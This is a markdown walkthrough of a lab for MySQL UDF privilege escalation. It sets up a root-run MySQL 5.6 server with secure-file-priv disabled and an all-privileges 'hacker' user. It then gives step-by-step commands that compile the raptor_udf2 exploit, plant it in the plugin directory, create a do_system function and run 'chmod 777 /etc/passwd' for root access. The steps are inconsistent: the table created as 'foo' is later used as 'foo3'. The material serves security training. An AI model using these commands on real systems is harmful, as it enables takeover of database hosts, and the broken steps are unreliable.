# PE_via_SQL_on_root_(UDF)

# Setting-up lab:

## Download and Install Required Packages

```
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-common_5.6.51-1debian9_amd64.deb>
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-community-client_5.6.51-1debian9_amd64.deb>
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-client_5.6.51-1debian9_amd64.deb>
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-community-server_5.6.51-1debian9_amd64.deb>
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-server_5.6.51-1debian9_amd64.deb>

```

## Missing dependencies if any

Add the Debian repo 

```
sudo vim /etc/apt/sources.list
```

Add the following line at the end:

```
 deb <http://archive.debian.org/debian> stretch main
```

Update and Install Dependencies

```
sudo apt update
sudo apt install -y libaio1 libncurses5 libtinfo5
```

## Install the Packages in Order

```
sudo dpkg -i mysql-common_5.6.51-1debian9_amd64.deb
sudo dpkg -i mysql-community-client_5.6.51-1debian9_amd64.deb
sudo dpkg -i mysql-client_5.6.51-1debian9_amd64.deb
sudo dpkg -i mysql-community-server_5.6.51-1debian9_amd64.deb
sudo dpkg -i mysql-server_5.6.51-1debian9_amd64.deb
```

Start and set to start on boot

```
sudo systemctl start mysql
sudo systemctl enable mysql
```

Verify MySQL version:

```
mysql --version
```

## Change user to root:

```
sudo vim /lib/systemd/system/mysql.service
```

Find:

```
User=mysql
Group=mysql
```

Change to:

```
User=root
Group=root
```

Restart:

```

 sudo systemctl daemon-reload
 sudo systemctl restart mysql
```

Now MySQL will run as root. 🚀

## Run service for local host:

```
sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf
```

Find the bind-address and change it to local host:

```
bind-address = 127.0.0.1
```

Create a mysql user:

```
mysql -u root -p
```

Inside MYSQL, run

```

CREATE USER 'hacker'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'localhost' WITH GRANT OPTION;
FLUSH PRIVILEGES;

```

## Disable secure-file-priv:

Edit file /etc/mysql/mysql.conf.d/mysqld.cnf:

```
sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf
```

Give secure-file-priv an empty value

```
secure-file-priv=
```

Restart MYSQL:

```
sudo systemctl restart mysql
```

## Enumeration:

```
netstat -nltup
```

```
ps -aux | grep "mysql"
```

# Exploiatation

login mysql as mysql user

```
mysql -u hacker -p password
```

check version:

```
select @@version;
```

check architecture:

```
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
```

The exploit that has been used

  [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

Compile it

```
gcc -g -c 1518.c
```

Into library .so

```
gcc -g -shared -Wl,-soname,raptor_udf2.so -o [1518_udf.so](http://1518.so/) 1518.o -lc
```

Find any writable directory and move the 1518_udf.so in to that directory(not neccessary , you can use current directory)

```
mv ./1518_udf.so /tmp
```

now to exploit UDF:

inside mysql:

```
use mysql;
```

create a table named foo

```
create table foo(line blob);
```

use load-file function to insert the content into the table.

```
insert into foo3 values(load_file('/tmp/1518_udf.so'));
```

Check plugin dir location:

```
 select @@plugin_dir;
```

Dump that inserted shared library content in the plugin directory location.

```
select * from foo3 into dumpfile '/usr/lib/mysql/plugin/1518_udf.so';
```

 Create function:

```
create function do_system returns integer soname '1518_udf.so';
```

Use function for exploitation:

```
 select do_system('ping -c 4 192.168.0.225');      
```

Change the permission of /etc/passwd to 777 for root access

```
 select do_system('chmod 777 /etc/passwd');
```